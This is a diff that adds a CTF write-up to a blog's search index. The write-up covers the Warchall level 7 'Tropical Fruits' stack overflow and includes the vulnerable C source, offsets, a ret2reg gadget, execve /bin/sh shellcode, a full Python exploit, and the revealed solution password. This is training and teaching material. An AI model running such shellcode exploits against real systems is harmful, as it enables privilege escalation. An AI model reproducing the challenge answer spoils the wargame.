@@ -23665,4 +23665,49 @@ waiting for server-side state updates eventually produced:</p>
         <tag>blind</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WeChall - Training - Warchall - 7 Tropical Fruits</title>
+    <url>/wp/WeChall/wechall-warchall-training-7-tropical-fruits/</url>
+    <content><![CDATA[<p>Warchall level 7 — 32-bit setgid ELF 栈溢出。ASLR enabled 但 NX
+disabled、无 PIE、无 canary，非常适合 ret2reg + shellcode 经典打法。利用
+<code>memcpy</code> 返回后 EAX 残留 vulnbuf 地址的特性，通过
+<code>call *%eax</code> gadget 跳转到栈上 shellcode 获取 setgid
+shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -p 19198 level07@warchall.net</span><br><span class="line">/home/level/07_tropical_fruits/</span><br></pre></td></tr></table></figure>
+<h3 id="challenge">Challenge</h3>
+<p>32-bit setgid ELF binary，源码由 <code>hint()</code> 函数泄露（调用
+<code>printf</code> 打印 "Need to bypass aslr" 后
+<code>exit(0)</code>）：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hint</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Need to bypass aslr\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnfunc</span><span class="params">(<span class="type">char</span> *input)</span> &#123;</span><br><span class="line">    <span class="type">char</span> vulnbuf[<span class="number">300</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(vulnbuf, input, <span class="built_in">strlen</span>(input));  <span class="comment">// 无边界检查</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>) vulnfunc(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;input&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>保护: setgid level07, NX disabled (GNU_STACK RWE), No PIE, No canary,
+ASLR enabled. libc: glibc 2.35.</p>
+<h3 id="solution">Solution</h3>
+<p><strong>漏洞</strong>:
+<code>memcpy(vulnbuf, input, strlen(input))</code>
+无边界检查，栈溢出。</p>
+<h4 id="stack-layout">Stack Layout</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub esp, 0x148 (328 bytes)</span><br><span class="line">vulnbuf  at ebp - 0x134 (ebp - 308)</span><br><span class="line">return addr at ebp + 4</span><br><span class="line">Offset to return address: 308 + 4 = 312 bytes</span><br></pre></td></tr></table></figure>
+<h4 id="关键-gadget">关键 Gadget</h4>
+<p><code>memcpy</code> 返回后 EAX = vulnbuf 地址（即栈上 shellcode
+地址），因此可以用 <code>call *%eax</code> 直接跳转到 shellcode。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x080484cf: call *%eax   ← 跳转到 shellcode</span><br></pre></td></tr></table></figure>
+<h4 id="shellcode">Shellcode</h4>
+<p>Null-free, 42 bytes:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; setregid(507, 507) — 继承 setgid 权限</span><br><span class="line">xor eax, eax</span><br><span class="line">xor ebx, ebx</span><br><span class="line">xor ecx, ecx</span><br><span class="line">mov bx, 0x1fb   ; 507</span><br><span class="line">mov cx, 0x1fb   ; 507</span><br><span class="line">mov al, 0x47    ; setregid32</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], NULL)</span><br><span class="line">xor eax, eax</span><br><span class="line">push eax</span><br><span class="line">push &quot;//sh&quot;</span><br><span class="line">push &quot;/bin&quot;</span><br><span class="line">mov ebx, esp</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov ecx, esp</span><br><span class="line">cdq             ; edx = 0</span><br><span class="line">mov al, 0x0b    ; execve</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<h4 id="exploit">Exploit</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Warchall Level 7 — Tropical Fruits exploit.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># Null-free shellcode (42 bytes)</span></span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\x31\xc0\x31\xdb\x31\xc9&quot;</span>              <span class="comment"># xor eax; xor ebx; xor ecx</span></span><br><span class="line">    <span class="string">b&quot;\x66\xbb\xfb\x01\x66\xb9\xfb\x01&quot;</span>      <span class="comment"># mov bx, 0x1fb; mov cx, 0x1fb</span></span><br><span class="line">    <span class="string">b&quot;\xb0\x47\xcd\x80&quot;</span>                      <span class="comment"># mov al, 0x47; int 0x80</span></span><br><span class="line">    <span class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68&quot;</span>      <span class="comment"># xor eax; push eax; push &quot;//sh&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x68\x2f\x62\x69\x6e\x89\xe3&quot;</span>          <span class="comment"># push &quot;/bin&quot;; mov ebx, esp</span></span><br><span class="line">    <span class="string">b&quot;\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&quot;</span>  <span class="comment"># push eax; push ebx; mov ecx, esp; cdq; mov al, 0x0b; int 0x80</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">312</span></span><br><span class="line">CALL_EAX = struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x080484cf</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode + <span class="string">b&quot;\x90&quot;</span> * (OFFSET - <span class="built_in">len</span>(shellcode)) + CALL_EAX</span><br><span class="line"></span><br><span class="line">subprocess.run(</span><br><span class="line">    [<span class="string">&quot;/home/level/07_tropical_fruits/level07&quot;</span>, payload],</span><br><span class="line">    env=&#123;<span class="string">&quot;PWD&quot;</span>: <span class="string">&quot;/home/level/07_tropical_fruits&quot;</span>&#125;,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>执行后交互式 shell 继承 setgid level07，可读 solution.txt。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">LetsGetItOn!</span></span>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+        <tag>writeup</tag>
+        <tag>wechall</tag>
+        <tag>warchall</tag>
+      </tags>
+  </entry>
 </search>
